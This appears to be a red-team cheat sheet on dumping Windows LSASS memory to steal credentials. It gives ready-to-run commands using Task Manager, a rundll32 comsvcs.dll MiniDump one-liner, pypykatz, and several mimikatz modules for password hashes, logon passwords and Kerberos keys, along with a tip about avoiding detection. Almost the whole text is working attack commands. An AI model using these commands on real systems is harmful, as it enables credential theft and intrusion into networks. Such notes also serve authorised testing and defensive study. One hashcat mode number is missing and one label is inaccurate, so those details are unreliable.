Local Security Authority Subsystem Service Memory is responsible for verifying credentials when user logs in, password change, creating access tokens... This service stores credential in memory.
- Dumping LSASS process memory is easily traceable, should be avoided when possible.

Hash format:
- NTLM/RC4-HMAC (hashcat 1000)
- des_cbc_md4 (hashcat )
- aes256-cts-hmac-sha1-96 (hashcat 28900)

(Task Manger) Dumping LSASS memory file
```
Task Manager > Processes > right click Local Security Authority Process > Create dump file
```
(LOLBAS) Dumping LSASS memory file
```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <LSASS PID> C:\lsass.dmp full
```
(Pypykatz) Reading LSASS memory dump file
```bash
pypykatz lsa minidump lsass.dmp
```
(Mimikatz) Dumping LSASS memory SAM database
```powershell
mimikatz.exe lsadump::sam
```
(Mimikatz) Dumping LSASS memory recently logged in users
```powershell
mimikatz.exe sekurlsa::logonpasswords
```
(Mimikatz) Kerberos keys encryption keys
```bash
mimikatz.exe sekurlsa::ekeys
```